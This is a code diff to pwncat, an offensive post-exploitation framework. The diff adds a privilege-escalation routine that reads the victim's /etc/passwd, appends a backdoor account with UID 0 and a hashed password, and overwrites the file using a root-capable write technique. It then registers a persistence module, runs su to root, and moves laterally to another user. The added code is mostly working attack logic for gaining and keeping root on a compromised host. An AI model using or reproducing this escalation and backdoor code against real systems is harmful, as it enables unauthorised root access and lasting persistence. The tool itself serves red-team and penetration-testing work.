@@ -4,12 +4,14 @@ from io import BytesIO, StringIO
 import dataclasses
 import textwrap
 import time
+import crypt
 import os
 
 # import rich.prompt
 from rich.prompt import Confirm
 
 import pwncat
+from pwncat.util import console
 from pwncat.modules import (
     BaseModule,
     Argument,
@@ -244,6 +246,9 @@ class GTFOTechnique(Technique):
 
     def write(self, filepath: str, data: str):
 
+        if not isinstance(data, bytes):
+            data = data.encode("utf-8")
+
         payload, input_data, exit_cmd = self.method.build(
             lfile=filepath, length=len(data), **self.kwargs
         )
@@ -269,9 +274,11 @@ class GTFOTechnique(Technique):
             no_job=True,
         )
 
+        time.sleep(0.5)
+
         # Write the data and close the process
         with self.method.wrap_stream(pipe) as pipe:
-            pipe.write(data.encode("utf-8"))
+            pipe.write(data)
 
     def read(self, filepath: str):
 
@@ -762,6 +769,70 @@ class EscalateResult(Result):
                         )
                     except EscalateError:
                         continue
+
+        # Read /etc/passwd
+        progress.update(task, status="reading /etc/passwd")
+        with pwncat.victim.open("/etc/passwd", "r") as filp:
+            passwd = filp.readlines()
+
+        username = pwncat.victim.config["backdoor_user"]
+        password = pwncat.victim.config["backdoor_pass"]
+        hashed = crypt.crypt(password)
+
+        passwd.append(f"{username}:{hashed}:0:0::/root:{pwncat.victim.shell}\n")
+        passwd_content = "".join(passwd)
+
+        try:
+            progress.update(task, status="attempting to overwrite /etc/passwd")
+            # Add a new user
+            technique = self.write(
+                "root",
+                "/etc/passwd",
+                passwd_content.encode("utf-8"),
+                progress,
+                no_exec=True,
+            )
+
+            # Register the passwd persistence
+            progress.update(task, status="registering persistence")
+            pwncat.modules.find("persist.passwd").register(
+                user="root",
+                backdoor_user=username,
+                backdoor_pass=password,
+                shell=pwncat.victim.shell,
+            )
+
+            # Reload user database
+            pwncat.victim.reload_users()
+
+            try:
+                # su to root
+                progress.update(task, status="escalating to root")
+                pwncat.victim.su(username, password)
+                exit_cmd = "exit\n"
+
+                if user != "root":
+                    # We're now root, passwords don't matter
+                    progress.update(task, status=f"moving laterally to {user}")
+                    pwncat.victim.su(user, None)
+                    exit_cmd += "exit\n"
+
+                # Notify user that persistence was installed
+                progress.log("installed persist.passwd module for escalation")
+
+                return EscalateChain(original_user.name, [(technique, exit_cmd)])
+            except PermissionError:
+                # Remove the persistence method. It didn't work for some reason.
+                pwncat.modules.find("persist.passwd").run(
+                    remove=True,
+                    user="root",
+                    backdoor_user=username,
+                    backdoor_pass=password,
+                    shell=pwncat.victim.shell,
+                    progress=progress,
+                )
+        except EscalateError:
+            pass
 
         progress.update(task, status="checking for ssh server")
 
